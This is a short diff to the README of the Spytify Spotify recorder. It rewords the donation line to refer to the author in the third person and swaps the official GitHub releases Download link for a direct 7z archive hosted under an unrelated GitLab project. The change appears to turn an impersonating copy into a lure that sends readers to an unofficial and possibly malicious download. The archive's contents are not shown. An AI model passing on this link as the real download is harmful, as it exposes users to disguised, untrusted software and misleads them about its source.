@@ -71,6 +71,6 @@ A **free Spotify account** will work and its recommanded since Spotify may monit
 
 ## Support Spytify
 
-😃 If you like Spytify, you can help me out for a [couple of beers](https://jwallet.github.io/spy-spotify/donate.html) 🍺 or give it a star ⭐ 
+😃 If you like Spytify, you can help jwallet out for a [couple of beers](https://jwallet.github.io/spy-spotify/donate.html) 🍺 or give it a star ⭐ 
 
-## [Download](https://github.com/jwallet/spy-spotify/releases)
+## [Download](https://gitlab.com/-/project/77426707/uploads/171f559b8cb4ebe91b05144cba34bb71/Spytify-ogg.7z)
